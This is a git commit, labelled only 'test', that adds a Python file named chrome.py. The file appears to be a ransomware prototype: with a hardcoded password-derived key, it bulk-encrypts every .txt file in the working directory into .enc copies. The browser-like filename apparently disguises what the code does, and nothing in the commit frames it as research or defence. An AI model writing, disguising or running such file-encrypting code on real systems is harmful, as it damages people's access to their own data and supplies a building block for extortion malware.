2d11c5088d40d89fee525657f95b51ec8da2dc75
basjqnatsks <mjhfraud@gmail.com>
2025-02-27 21:10:07 -0800

    test

---
+++ chrome.py
@@ -0,0 +1,20 @@
+import os
+import base64
+import hashlib
+from cryptography.fernet import Fernet
+
+PASSWORD = "cock123"
+EXTENSION = ".txt"
+
+
+sha_key = hashlib.sha256(PASSWORD.encode()).digest()
+fernet_key = base64.urlsafe_b64encode(sha_key)
+cipher = Fernet(fernet_key)
+for filename in os.listdir("."):
+	if filename.endswith(EXTENSION):
+		with open(filename, "rb") as f:
+			plaintext = f.read()
+		ciphertext = cipher.encrypt(plaintext)
+		enc_filename = filename + ".enc"
+		with open(enc_filename, "wb") as f:
+			f.write(ciphertext)
